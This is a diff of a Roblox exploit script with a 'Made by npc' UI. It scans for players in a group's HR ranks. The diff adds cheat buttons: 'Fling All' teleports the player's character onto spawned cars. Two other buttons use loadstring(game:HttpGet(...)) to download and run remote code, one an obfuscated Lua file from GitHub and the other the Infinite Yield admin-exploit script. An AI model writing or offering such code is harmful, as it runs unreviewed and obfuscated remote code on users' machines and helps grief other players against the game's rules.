@@ -1,6 +1,6 @@
 local groupId = 10261023
 local rankNames = {
-    "Junior Director", "Senior Director", "Head Director", "Corporate Intern", 
+    "Senior Director", "Head Director", "Corporate Intern", 
     "Junior Corporate", "Senior Corporate", "Head Corporate", "Chief Human Resources Officer",
     "Chief Public Relations Officer", "Chief Operating Officer", "Chief Administrative Officer",
     "Developer", "Vice Chairman", "Chairman"
@@ -23,8 +23,8 @@ local function countHRPlayers()
             return player:GetRoleInGroup(groupId)
         end)
         if success then
-            for _, hrRank in ipairs(rankNames) do
-                if hrRank == rank then
+            for _, rankName in ipairs(rankNames) do
+                if rankName == rank then
                     hrCount = hrCount + 1
                     break
                 end
@@ -46,8 +46,23 @@ local Window = Library.CreateLib("Made by npc", "DarkTheme")
 local Tab = Window:NewTab("Main Page")
 local Section = Tab:NewSection("Main Page")
 
-Section:NewButton("Test Notification", "ButtonInfo", function()
-    sendNotification("Test Notification", "This is a test notification.")
+local function flingAll()
+    for _, v in pairs(workspace.SpawnedCars:GetChildren()) do
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.PrimaryPart.CFrame
+        task.wait(0.1)
+    end
+end
+
+Section:NewButton("Fling All", "ButtonInfo", function()
+    flingAll()
+end)
+
+Section:NewButton("Fling Script", "ButtonInfo", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
+end)
+
+Section:NewButton("Infinite Yield", "ButtonInfo", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 end)
 
 -- HR Scan button
